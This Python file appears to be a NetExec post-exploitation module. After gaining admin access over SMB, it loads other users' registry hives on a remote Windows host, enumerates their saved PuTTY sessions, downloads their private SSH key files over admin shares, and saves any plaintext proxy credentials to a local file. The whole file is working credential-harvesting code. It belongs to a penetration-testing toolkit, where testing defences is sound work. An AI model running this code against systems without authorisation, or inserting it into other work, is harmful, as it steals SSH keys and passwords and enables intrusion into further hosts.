from datetime import datetime
from io import BytesIO
import traceback
from urllib.parse import unquote
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5 import rrp
from impacket.examples.secretsdump import RemoteOperations
from os import makedirs
from nxc.helpers.logger import highlight
from nxc.paths import NXC_PATH
import re


class NXCModule:
    """Module by @NeffIsBack"""

    name = "putty"
    description = "Query the registry for users who saved ssh private keys in PuTTY. Download the private keys if found."
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def __init__(self):
        self.context = None
        self.module_options = None
        self.rrp = None

    def options(self, context, module_options):
        """No options available"""

    def get_logged_on_users(self):
        """Enumerate all logged in and loaded Users on System"""
        reg_handle = rrp.hOpenUsers(self.rrp._RemoteOperations__rrp)["phKey"]
        key_handle = rrp.hBaseRegOpenKey(self.rrp._RemoteOperations__rrp, reg_handle, "")["phkResult"]
        users = rrp.hBaseRegQueryInfoKey(self.rrp._RemoteOperations__rrp, key_handle)["lpcSubKeys"]

        # Get User Names
        user_objects = [rrp.hBaseRegEnumKey(self.rrp._RemoteOperations__rrp, key_handle, i)["lpNameOut"].split("\x00")[:-1][0] for i in range(users)]
        rrp.hBaseRegCloseKey(self.rrp._RemoteOperations__rrp, key_handle)

        # Filter legit users in regex
        user_objects.remove(".DEFAULT")
        regex = re.compile(r"^.*_Classes$")
        return [i for i in user_objects if not regex.match(i)]

    def get_all_users(self):
        """Get all users that have logged in at some point in time"""
        reg_handle = rrp.hOpenLocalMachine(self.rrp._RemoteOperations__rrp)["phKey"]
        key_handle = rrp.hBaseRegOpenKey(self.rrp._RemoteOperations__rrp, reg_handle, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList")["phkResult"]
        users = rrp.hBaseRegQueryInfoKey(self.rrp._RemoteOperations__rrp, key_handle)["lpcSubKeys"]

        # Get User Names
        user_objects = [rrp.hBaseRegEnumKey(self.rrp._RemoteOperations__rrp, key_handle, i)["lpNameOut"].split("\x00")[:-1][0] for i in range(users)]
        rrp.hBaseRegCloseKey(self.rrp._RemoteOperations__rrp, key_handle)
        return user_objects

    def sid_to_name(self, all_users):
        """Convert SID to Usernames for better readability"""
        reg_handle = rrp.hOpenLocalMachine(self.rrp._RemoteOperations__rrp)["phKey"]

        user_dict = {}
        for user_object in all_users:
            key_handle = rrp.hBaseRegOpenKey(self.rrp._RemoteOperations__rrp, reg_handle, f"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\{user_object}")["phkResult"]
            user_profile_path = rrp.hBaseRegQueryValue(self.rrp._RemoteOperations__rrp, key_handle, "ProfileImagePath")[1].split("\x00")[:-1][0]
            rrp.hBaseRegCloseKey(self.rrp._RemoteOperations__rrp, key_handle)
            user_dict[user_object] = user_profile_path.split("\\")[-1]
        return user_dict

    def load_missing_users(self, unloaded_user_objects):
        """Load missing users into registry to access their registry keys."""
        for user_object in unloaded_user_objects:
            # Extract profile Path of NTUSER.DAT
            reg_handle = rrp.hOpenLocalMachine(self.rrp._RemoteOperations__rrp)["phKey"]
            key_handle = rrp.hBaseRegOpenKey(self.rrp._RemoteOperations__rrp, reg_handle, f"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\{user_object}")["phkResult"]
            user_profile_path = rrp.hBaseRegQueryValue(self.rrp._RemoteOperations__rrp, key_handle, "ProfileImagePath")[1].split("\x00")[:-1][0]
            rrp.hBaseRegCloseKey(self.rrp._RemoteOperations__rrp, key_handle)

            # Load Profile
            reg_handle = rrp.hOpenUsers(self.rrp._RemoteOperations__rrp)["phKey"]
            key_handle = rrp.hBaseRegOpenKey(self.rrp._RemoteOperations__rrp, reg_handle, "")["phkResult"]

            self.context.log.debug(f"LOAD USER INTO REGISTRY: {user_object}")
            rrp.hBaseRegLoadKey(self.rrp._RemoteOperations__rrp, key_handle, user_object, f"{user_profile_path}\\NTUSER.DAT")
            rrp.hBaseRegCloseKey(self.rrp._RemoteOperations__rrp, key_handle)

    def unload_missing_users(self, unloaded_user_objects):
        """If some user were not logged in at the beginning we unload them from registry."""
        reg_handle = rrp.hOpenUsers(self.rrp._RemoteOperations__rrp)["phKey"]
        key_handle = rrp.hBaseRegOpenKey(self.rrp._RemoteOperations__rrp, reg_handle, "")["phkResult"]

        for user_object in unloaded_user_objects:
            self.context.log.debug(f"UNLOAD USER FROM REGISTRY: {user_object}")
            try:
                rrp.hBaseRegUnLoadKey(self.rrp._RemoteOperations__rrp, key_handle, user_object)
            except Exception as e:
                self.context.log.fail(f"Error unloading user {user_object} in registry: {e}")
                self.context.log.debug(traceback.format_exc())
        rrp.hBaseRegCloseKey(self.rrp._RemoteOperations__rrp, key_handle)

    def get_private_key_paths(self, all_users):
        """Get all private key paths for all users"""
        sessions = []
        reg_handle = rrp.hOpenUsers(self.rrp._RemoteOperations__rrp)["phKey"]

        for user in all_users:
            try:
                key_handle = rrp.hBaseRegOpenKey(self.rrp._RemoteOperations__rrp, reg_handle, f"{user}\\Software\\SimonTatham\\PuTTY\\Sessions")["phkResult"]
                reg_sessions = rrp.hBaseRegQueryInfoKey(self.rrp._RemoteOperations__rrp, key_handle)["lpcSubKeys"]
                self.context.log.info(f'Found {reg_sessions} sessions for user "{self.user_dict[user]}" in registry!')

                # Get Session Names
                session_names = [rrp.hBaseRegEnumKey(self.rrp._RemoteOperations__rrp, key_handle, i)["lpNameOut"].split("\x00")[:-1][0] for i in range(reg_sessions)]
                rrp.hBaseRegCloseKey(self.rrp._RemoteOperations__rrp, key_handle)

                # Extract stored Session infos
                for session_name in session_names:
                    key_handle = rrp.hBaseRegOpenKey(self.rrp._RemoteOperations__rrp, reg_handle, f"{user}\\Software\\SimonTatham\\PuTTY\\Sessions\\{session_name}")["phkResult"]

                    # Get private Key Path
                    private_key_path = rrp.hBaseRegQueryValue(self.rrp._RemoteOperations__rrp, key_handle, "PublicKeyFile")[1].split("\x00")[:-1][0]
                    proxy_host = rrp.hBaseRegQueryValue(self.rrp._RemoteOperations__rrp, key_handle, "ProxyHost")[1].split("\x00")[:-1][0]
                    proxy_port = rrp.hBaseRegQueryValue(self.rrp._RemoteOperations__rrp, key_handle, "ProxyPort")[1]
                    proxy_username = rrp.hBaseRegQueryValue(self.rrp._RemoteOperations__rrp, key_handle, "ProxyUsername")[1].split("\x00")[:-1][0]
                    proxy_password = rrp.hBaseRegQueryValue(self.rrp._RemoteOperations__rrp, key_handle, "ProxyPassword")[1].split("\x00")[:-1][0]

                    # Session infos
                    hostname = rrp.hBaseRegQueryValue(self.rrp._RemoteOperations__rrp, key_handle, "HostName")[1].split("\x00")[:-1][0]
                    port = rrp.hBaseRegQueryValue(self.rrp._RemoteOperations__rrp, key_handle, "PortNumber")[1]
                    protocol = rrp.hBaseRegQueryValue(self.rrp._RemoteOperations__rrp, key_handle, "Protocol")[1].split("\x00")[:-1][0]
                    sessions.append({
                        "user": self.user_dict[user],
                        "session_name": unquote(session_name),
                        "hostname": hostname,
                        "port": port,
                        "protocol": protocol,
                        "private_key_path": private_key_path,
                        "proxy_host": proxy_host,
                        "proxy_port": proxy_port,
                        "proxy_username": proxy_username,
                        "proxy_password": proxy_password
                    })
                    rrp.hBaseRegCloseKey(self.rrp._RemoteOperations__rrp, key_handle)

            except DCERPCException as e:
                if str(e).find("ERROR_FILE_NOT_FOUND"):
                    self.context.log.debug(f"No PuTTY session config found in registry for user {self.user_dict[user]}")
            except Exception as e:
                self.context.log.fail(f"Unexpected error: {e}")
                self.context.log.debug(traceback.format_exc())
        return sessions

    def extract_session(self, sessions):
        proxycreds_file = f"{NXC_PATH}/modules/PuTTY/putty_proxycreds_{datetime.now().strftime('%Y-%m-%d_%H%M%S')}".replace(":", "-")
        for session in sessions:
            if session["private_key_path"]:
                makedirs(f"{NXC_PATH}/modules/PuTTY", exist_ok=True)
                share = session["private_key_path"].split(":")[0] + "$"
                file_path = session["private_key_path"].split(":")[1]
                download_path = f"{NXC_PATH}/modules/PuTTY/putty_{session['user']}_{session['session_name']}_{datetime.now().strftime('%Y-%m-%d_%H%M%S')}.sec".replace(":", "-")

                buf = BytesIO()
                with open(download_path, "wb") as file:
                    try:
                        self.connection.conn.getFile(share, file_path, buf.write)
                    except Exception as e:
                        if str(e).find("STATUS_OBJECT_NAME_NOT_FOUND") != -1:
                            self.context.log.fail(f"Private key path found but file not found: {share + file_path}")
                        else:
                            self.context.log.exception(f"Error downloading private key: {e}")
                        continue
                    file.write(buf.getvalue())
                self.context.log.success(f"Private key found for user \"{session['user']}\", saved to {highlight(download_path)}")
                self.context.log.highlight(f"Sessionname: {session['session_name']}")
                self.context.log.highlight(f"Host: {session['hostname']}:{session['port']}")
                self.context.log.highlight(f"Protocol: {session['protocol']}")
            if session["proxy_password"]:
                self.context.log.success(f"Found proxy credentials for user \"{session['user']}\"")
                self.context.log.highlight(f"Sessionname: {session['session_name']}")
                self.context.log.highlight(f"Host: {session['hostname']}:{session['port']}")
                self.context.log.highlight(f"Protocol: {session['protocol']}")
                self.context.log.highlight(f"Proxy Host: {session['proxy_host']}:{session['proxy_port']}")
                self.context.log.highlight(f"Proxy Username: {session['proxy_username']}")
                self.context.log.highlight(f"Proxy Password: {session['proxy_password']}")
                with open(proxycreds_file, "a") as f:
                    f.write("================\n")
                    f.write(f"User: {session['user']}\n")
                    f.write(f"Sessionname: {session['session_name']}\n")
                    f.write(f"Host: {session['hostname']}:{session['port']}\n")
                    f.write(f"Protocol: {session['protocol']}\n")
                    f.write(f"Proxy Host: {session['proxy_host']}:{session['proxy_port']}\n")
                    f.write(f"Proxy Username: {session['proxy_username']}\n")
                    f.write(f"Proxy Password: {session['proxy_password']}\n")
                self.context.log.display(f"Proxy credentials saved to {highlight(proxycreds_file)}")

    def on_admin_login(self, context, connection):
        self.connection = connection
        self.context = context

        try:
            self.rrp = RemoteOperations(connection.conn, connection.kerberos)
            self.rrp.enableRegistry()

            all_users = self.get_all_users()
            loaded_user_objects = self.get_logged_on_users()
            self.user_dict = self.sid_to_name(all_users)

            # Users which must be loaded into registry:
            unloaded_user_objects = list(set(all_users).symmetric_difference(set(loaded_user_objects)))
            self.load_missing_users(unloaded_user_objects)

            sessions = self.get_private_key_paths(all_users)
            if sessions:
                self.extract_session(sessions)
            else:
                self.context.log.info("No saved putty sessions found in registry")

            self.unload_missing_users(unloaded_user_objects)
        except Exception as e:
            context.log.exception(f"Error: {e}")
        finally:
            self.rrp.finish()
